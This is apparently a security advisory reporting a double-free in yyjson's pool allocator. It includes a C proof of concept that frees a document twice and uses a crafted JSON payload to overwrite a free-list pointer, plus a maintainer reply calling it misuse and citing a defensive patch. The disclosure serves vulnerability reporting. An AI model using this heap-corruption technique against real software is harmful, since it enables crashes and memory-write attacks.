## Description

### Summary

*Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.*

The pool series allocator (pool\_malloc/pool\_free/pool\_realloc) by yysjon has a Double Free vulnerability, which may lead to arbitrary address writing and Denial of Service (DoS) attacks.

Arbitrary address writing, combined with other legitimate or illegitimate operations of programs using this library, can lead to remote code execution.

### Details

*Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.*

The core cause of this vulnerability lies in the pool\_free function's lack of loop checks, while the direct cause stems from the pool\_free function and similar free-series functions not performing pointer destruction, resulting in Use-After-Free (UAF) vulnerabilities.

### PoC

*Complete instructions, including specific configuration details, to reproduce the vulnerability.*

Below, a C language program using yyjson 0.8.0 is written to show how to exploit a Double Free vulnerability to cause chunk overlaps, which then allows the modification of a chunk's next pointer to point to an arbitrary address. If the targeted address is valid, modifications can be made. However, if the address is invalid, it could lead to the program crashing, which could be exploited for a Denial of Service (DoS) attack. Additionally, constructing a cyclic chain of chunks could force the service into an infinite loop, also exploitable for a DoS attack.

```
#include <stdio.h>
#include "yyjson.h"

char test[0x110];
int64_t a=0xffffffff;
int64_t b= (int64_t) test;

int main() {

    size_t max_json_size = 64 * 1024;

    size_t buf_size = yyjson_read_max_memory_usage(max_json_size, 0);

    void *buf = malloc(buf_size);

    yyjson_alc alc;
    yyjson_alc_pool_init(&alc, buf, buf_size);

    yyjson_mut_doc *p1 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p2 = yyjson_mut_doc_new(&alc);
    yyjson_mut_arr(p2);

    yyjson_mut_doc *p3 = yyjson_mut_doc_new(&alc);

    yyjson_mut_doc_free(p2);
    yyjson_mut_doc_free(p2); // double free
    yyjson_mut_doc_free(p1);

    yyjson_read_flag flg = YYJSON_READ_ALLOW_COMMENTS | YYJSON_READ_ALLOW_INF_AND_NAN;

    for(int i=0;i<0x100;i++)test[i]= 'a';
    test[0x100]='\00';
    char *payload_f = "[%lld,43981]";

    char payload[100];
    sprintf(payload,payload_f,&a);
    yyjson_mut_doc *p4 = yyjson_read_opts(payload,strlen(payload),flg,&alc,NULL);

    yyjson_mut_doc *p5 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p6 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p7 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p8 = yyjson_mut_doc_new(&alc);
    for(int z=1;z<=100;z++)
    yyjson_mut_int(p8,0x63636363);

    printf("%s",test);
    free(buf);
    return 0;
}

```
### Impact

*What kind of vulnerability is it? Who is impacted?*

## Note from yyjson

`yyjson_mut_doc_free()` is well-documented:

<https://github.com/ibireme/yyjson/blob/0.8.0/src/yyjson.h#L2090-L2093>

```
/** Release the JSON document and free the memory.
    After calling this function, the `doc` and all values from the `doc` are no
    longer available. This function will do nothing if the `doc` is NULL.  */
void yyjson_mut_doc_free(yyjson_doc *doc);
```

If you have already called `yyjson_mut_doc_free()` on a doc, the doc and its internal values are invalid.

Any further operation on the doc or its values is undefined behavior.

While this is not a bug in yyjson itself, a defensive patch has been provided: [0eca326](https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e)

If you mistakenly call `yyjson_mut_doc_free()` twice on the same doc against the documentation,

this patch will cause your program to crash immediately, alerting you to the incorrect usage.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
